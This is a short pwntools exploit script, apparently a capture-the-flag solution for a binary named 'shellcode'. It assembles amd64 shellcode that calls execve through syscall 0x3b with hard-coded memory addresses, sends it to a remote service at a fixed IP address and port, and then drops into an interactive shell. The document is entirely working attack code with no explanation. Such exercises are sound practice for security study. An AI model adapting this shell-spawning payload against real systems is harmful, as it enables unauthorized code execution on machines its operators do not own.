```python3
#!/usr/bin/python3
from pwn import *
from past.builtins import xrange
from time import sleep
import random
import subprocess

# exploit
def Pwn():
 global io

 shellcode = asm(f'''
  mov rax, 0x3b
  mov rsp, {0x4040b0}
  mov rdi, {0x404060}
  mov rsi, {0}
  mov rdx, {0}
  syscall
 ''',arch='amd64')

 pause()
 io.sendafter('NULL, NULL)\n',shellcode)

if __name__=='__main__':
# io = process('./shellcode')
 io = remote('20.48.83.165', 20005)
 Pwn()
 io.interactive()
```
